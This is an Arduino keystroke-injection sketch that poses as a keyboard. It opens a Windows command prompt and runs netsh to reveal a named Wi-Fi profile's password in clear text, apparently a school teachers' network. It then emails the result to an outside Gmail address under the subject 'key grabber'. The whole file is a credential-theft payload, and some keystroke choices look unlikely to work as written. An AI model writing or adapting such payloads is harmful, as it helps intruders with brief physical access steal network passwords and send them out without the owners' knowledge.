#include "Keyboard.h"

void setup() {
  Keyboard.begin();
  delay(1000);
  runscript();
  Keyboard.end();
}

void processKey(int key) {
  Keyboard.press(key);
  delay(500);
  Keyboard.releaseAll();
}

void openSearchWindow() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
}

void runscript() {
  openSearchWindow();

  Keyboard.print("cmd");
  processKey(KEY_INSERT);

  Keyboard.print("netsh wlan show profiles Enseignents key=clear");
  processKey(KEY_INSERT);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  delay(500);
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  openSearchWindow();

  Keyboard.print("courrier");
  processKey(KEY_INSERT);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('n');
  Keyboard.releaseAll();

  Keyboard.print("SkyrethTM@gmail.com");
  processKey(KEY_TAB);
  processKey(KEY_TAB);
  processKey(KEY_TAB);
  
  Keyboard.print("key grabber");
  processKey(KEY_TAB);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_INSERT);
  Keyboard.releaseAll();
}

void loop() {

}
